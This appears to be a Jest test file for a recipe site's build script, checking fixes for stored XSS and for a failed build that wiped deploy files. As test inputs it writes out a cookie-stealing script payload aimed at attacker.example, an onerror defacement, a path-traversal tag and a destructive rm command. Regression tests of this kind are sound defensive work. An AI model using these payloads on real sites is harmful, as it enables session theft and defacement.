/**
 * Tests for scripts/preserve-build.js security fixes.
 *
 * scripts/preserve-build.js is a plain ESM .js file (the project's
 * "type": "module" build script, run via `node scripts/preserve-build.js`,
 * never via `astro build` directly). Jest's CJS-based transform can't load
 * raw ESM `.js` files directly, so these tests exercise the real script via
 * Node subprocesses — the same way it actually runs in production — rather
 * than duplicating its logic in the test.
 *
 * Covers:
 *  - RT-2026-07-30-01: stored XSS via unsanitised recipe markdown.
 *  - RT-2026-07-30-02: a build failure permanently deleting the deploy
 *    repo's .git/CNAME/.nojekyll.
 */

import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

const projectRoot = path.resolve(__dirname, '../..');
const scriptPath = path.join(projectRoot, 'scripts/preserve-build.js');

/** Runs a small ESM snippet that imports preserve-build.js and prints JSON. */
function runSnippet(code: string): any {
  const output = execFileSync('node', ['--input-type=module', '-e', code], {
    cwd: projectRoot,
    encoding: 'utf8',
  });
  const lastLine = output.trim().split('\n').pop() as string;
  return JSON.parse(lastLine);
}

describe('sanitizeMarkdownContent (RT-2026-07-30-01)', () => {
  test('neutralises the exact stored-XSS payload from the red-team repro', () => {
    const payload =
      "# Recipe\n\n<script>fetch('https://attacker.example/steal?d='+document.cookie)</script>" +
      "<img src=x onerror=\"document.body.innerHTML='<h1>DEFACED</h1>'\">";

    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      const payload = ${JSON.stringify(payload)};
      const sanitized = sanitizeMarkdownContent(payload);
      console.log(JSON.stringify({
        sanitized,
        containsScriptTag: sanitized.includes('<script>'),
        containsOnerror: /<img[^>]*onerror=/.test(sanitized),
      }));
    `);

    expect(result.containsScriptTag).toBe(false);
    expect(result.containsOnerror).toBe(false);
    // The payload text itself is preserved (as inert text), not deleted.
    expect(result.sanitized).toContain('DEFACED');
  });

  test('leaves ordinary recipe markdown untouched', () => {
    const normal = '# Autumn Salad\n\n## Ingredients\n- Beetroots\n- Mushrooms\n';
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify({ sanitized: sanitizeMarkdownContent(${JSON.stringify(normal)}) }));
    `);
    expect(result.sanitized).toBe(normal);
  });
});

describe('validateRecipeFrontmatter (RT-2026-07-30-02)', () => {
  const goodFrontmatter =
    "---\n" +
    "layout: ../../layout/Post/MarkdownPostLayout.astro\n" +
    "title: 'Test Recipe'\n" +
    "pubDate: '2023-10-14'\n" +
    "description: 'A test recipe'\n" +
    "author: 'Test Author'\n" +
    "tags: [\"Autumn\", \"Light course\"]\n" +
    "---\n" +
    "Body text\n";

  function validate(content: string): any {
    return runSnippet(`
      import { validateRecipeFrontmatter } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify(validateRecipeFrontmatter(${JSON.stringify(content)}, 'test.md')));
    `);
  }

  test('accepts well-formed frontmatter', () => {
    expect(validate(goodFrontmatter).valid).toBe(true);
  });

  test('rejects the exact malformed tag from the red-team repro (path traversal)', () => {
    const bad = goodFrontmatter.replace('"Light course"', '"../../../../PWNED-TRAVERSAL"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/tag/i);
  });

  test('rejects a stray-quote tag (matches the committed `burgers"` bug)', () => {
    const bad = goodFrontmatter.replace('"Light course"', 'burgers"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
  });

  test('rejects frontmatter missing a required field (e.g. pubDate)', () => {
    const bad = goodFrontmatter.replace(/pubDate:.*\n/, '');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/pubDate/);
  });
});

describe('preserved files survive a failed build (RT-2026-07-30-02 end-to-end)', () => {
  jest.setTimeout(30000);

  let scratchDir: string;

  beforeEach(() => {
    scratchDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ags-preserve-build-'));

    // Minimal astro.config.mjs sibling: preserve-build.js resolves
    // '../astro.config.mjs' relative to its own location, so it must be
    // copied alongside the script inside the scratch project.
    fs.mkdirSync(path.join(scratchDir, 'scripts'), { recursive: true });
    fs.copyFileSync(scriptPath, path.join(scratchDir, 'scripts/preserve-build.js'));
    fs.writeFileSync(
      path.join(scratchDir, 'astro.config.mjs'),
      "export default { outDir: './out' };\n"
    );

    // node_modules is required for the script's `gray-matter` / `node-fetch`
    // imports; symlink the real one instead of duplicating it.
    fs.symlinkSync(
      path.join(projectRoot, 'node_modules'),
      path.join(scratchDir, 'node_modules'),
      'dir'
    );

    // Seed a fake "deploy repo" output directory with the files that must
    // be preserved across a build.
    const outDir = path.join(scratchDir, 'out');
    fs.mkdirSync(path.join(outDir, '.git'), { recursive: true });
    fs.writeFileSync(path.join(outDir, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    fs.writeFileSync(path.join(outDir, 'CNAME'), 'benjamindegryse.be\n');
    fs.writeFileSync(path.join(outDir, '.nojekyll'), '');
  });

  afterEach(() => {
    fs.rmSync(scratchDir, { recursive: true, force: true });
  });

  test('a failing "build" that also wipes outDir (simulating astro) still leaves .git/CNAME/.nojekyll restored', () => {
    const outDir = path.join(scratchDir, 'out');

    // Simulates what a real `astro build` failure looks like: outDir gets
    // emptied of the preserved files (astro clears outDir before rendering)
    // and the command exits non-zero (a render crash). Before the fix,
    // runAstroBuild() called process.exit(1) here, which skipped
    // restorePreservedFiles() entirely and left the deploy repo's .git gone.
    const failingBuildCommand = `rm -rf out/.git out/CNAME out/.nojekyll; exit 1`;

    let threw = false;
    try {
      execFileSync('node', ['scripts/preserve-build.js'], {
        cwd: scratchDir,
        env: { ...process.env, PRESERVE_BUILD_COMMAND: failingBuildCommand },
        stdio: 'pipe',
      });
    } catch (error) {
      // A failed build is expected to make the overall process exit
      // non-zero; that alone is not the bug under test.
      threw = true;
    }

    expect(threw).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });

  test('a successful build leaves preserved files in place and exits 0', () => {
    const outDir = path.join(scratchDir, 'out');

    execFileSync('node', ['scripts/preserve-build.js'], {
      cwd: scratchDir,
      env: { ...process.env, PRESERVE_BUILD_COMMAND: 'true' },
      stdio: 'pipe',
    });

    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });
});
